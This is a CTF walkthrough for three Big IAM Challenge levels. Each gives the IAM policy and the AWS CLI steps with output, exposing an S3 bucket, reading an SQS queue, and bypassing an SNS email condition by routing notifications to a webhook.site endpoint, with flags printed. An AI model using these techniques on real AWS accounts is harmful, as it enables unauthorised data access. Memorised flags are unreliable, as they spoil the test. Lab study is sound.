---

# THE BIG IAM CHALLEGE 
- https://bigiamchallenge.com/challenge/1
---

## [Challenge 1](https://bigiamchallenge.com/challenge/1)
###  Buckets of Fun We all know that public buckets are risky. But can you find the flag?

<img width="1396" alt="Screenshot 2025-04-10 at 1 09 16 AM" src="https://github.com/user-attachments/assets/eb889558-9f4c-4077-81bb-f0bd68a817d3" />

#### IAM POLICY
```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
        },
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:ListBucket",
            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
            "Condition": {
                "StringLike": {
                    "s3:prefix": "files/*"
                }
            }
        }
    ]
}
```


## Solution

```bash
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b
                           PRE files/
> aws s3 ls s3://thebigiamchallenge-storage-9979f4b --recursive
2023-06-05 19:13:53         37 files/flag1.txt
2023-06-08 19:18:24      81889 files/logo.png
> aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
{wiz:exposed-storage-risky-as-usual}
> 
 ```

---

---


## [Challenge 2](https://bigiamchallenge.com/challenge/2)

###  Google Analytics We created our own analytics system specifically for this challenge. We think it's so good that we even used it on this page. What could go wrong? Join our queue and get the secret flag.


IAM POLICY

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": [
                "sqs:SendMessage",
                "sqs:ReceiveMessage"
            ],
            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
        }
    ]
}
```

## Solution

In the source page you will find:

<img width="1400" alt="Screenshot 2025-04-10 at 1 37 16 AM" src="https://github.com/user-attachments/assets/af7ca1c3-a1c4-4d3b-aba3-585d7214cadf" />

```json
// Initialize the Amazon Cognito credentials provider
  AWS.config.region = 'us-east-1';
AWS.config.credentials = new AWS.CognitoIdentityCredentials({IdentityPoolId: 'us-east-1:c6f3eb2e-3cb5-404e-93bc-f0bdf7ad042e'});
// Set the region
AWS.config.update({region: 'us-east-1'});

// Create an SQS service object for Web Analytics.
// Log trafic from all users into SQS.
var sqs = new AWS.SQS({apiVersion: '2012-11-05'});

var params = {
  DelaySeconds: 0,
  MessageBody: JSON.stringify({"URL": document.location.href, "User-Agent": navigator.userAgent, "IsAdmin": false}),
  QueueUrl: "https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2"
};

sqs.sendMessage(params, function(err, data) {
  if (err) {
    console.log("Error", err);
  } else {
    console.log("Success", data.MessageId);
  }
});
```

```bash
> aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2 -
-attribute-names All --message-attribute-names All --max-number-of-messages 10
{
    "Messages": [
        {
            "MessageId": "1a901338-3c28-4f9c-838e-08ad403afc39",
            "ReceiptHandle": "AQEBgGA1H/4osMm10hmRaZHLyN8XDQxzqBimU8LpiT21usZDEwp4EwbrSZNXTTamEJIj4SIwDLOPokBM1EVF5K/6EcgYTnJ
E82eheswF/nIZl+t2GTbcjQ1v3pP9vm0ijdCWqQaQ472EDLj2KF/TEL/lEQVsJFhfTJwLONKlavXpyuFQF+Sj6AsW2UEFfKdQVsQu4Q2rbk+mgNHI6HpU68MN2LUz
qZDh1tHWGoJA1OJvQSY2PxaD7vr644gFMwwoznpzcdw7ItrYI3PbBvkA4fmcR6ifJWxdYayz6Hrlgu3BuUrlZDAGFIIF5BB/vEs8gIAu/JNZhzaBxulWBqwRiKHBc
5u7LybpfbExBCFrudUO5PYvgc6XNb8QDI575iLf5R9oYGleQ7dH4+ffeN8SOzxwhI1i3Sipwe5dsA4DbvRL414=",
            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\"
: \"Lynx/2.5329.3258dev.35046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}",
            "Attributes": {
                "SenderId": "AROARK7LBOHXGHGQ5XCT5:tbic-wiz-send-flag-to-sqs-8d265a4",
                "ApproximateFirstReceiveTimestamp": "1744230603499",
                "ApproximateReceiveCount": "1",
                "SentTimestamp": "1744227388406",
                "AWSTraceHeader": "Root=1-67f6cc3c-2501b4910e004349426d8006;Parent=73146ee07a1ed731;Sampled=0;Lineage=1:037be
d70:0"
            }
        },
> curl https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html
{wiz:you-are-at-the-front-of-the-queue}
```

---

---

## [Challege 3](https://bigiamchallenge.com/challenge/3)

###  Enable Push Notifications We got a message for you. Can you get it?

IAM POLICY 

```bash
{
    "Version": "2008-10-17",
    "Id": "Statement1",
    "Statement": [
        {
            "Sid": "Statement1",
            "Effect": "Allow",
            "Principal": {
                "AWS": "*"
            },
            "Action": "SNS:Subscribe",
            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
            "Condition": {
                "StringLike": {
                    "sns:Endpoint": "*@tbic.wiz.io"
                }
            }
        }
    ]
}
```

## Solution

According to the policy, anyone can sign up for TBICWizPushNotifications alerts, but there is a requirement that the endpoint ends in @tbic.wiz.io.
Since we don't have any emails that finish in that domain, we can utilize webhooks to subscribe to it using a different protocol, such as HTTPS.  The URL is 
https://webhook.site

``` aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/{your-assigend-id}/@tbic.wiz.io```

```bash
> aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-e
ndpoint https://webhook.site/5c092bc0-4639-410f-b110-1277b64f1592/@tbic.wiz.io
{
    "SubscriptionArn": "pending confirmation"
}
>
```

Now check the webook website:

<img width="1368" alt="Screenshot 2025-04-10 at 2 21 53 AM" src="https://github.com/user-attachments/assets/208f10e5-6702-4af9-bc61-b567c05a0ecb" />

On the webhook dashboard, you will find a POST notification indicating Subscription confirmation. To validate the subscription for notifications, please go to the URL provided in the SubscribeURL within the confirmation message. Once you confirm, you will receive the flag as part of the message.


<img width="1395" alt="Screenshot 2025-04-10 at 2 18 06 AM" src="https://github.com/user-attachments/assets/64944856-c872-4ab6-93e5-d38800486699" />

---

---
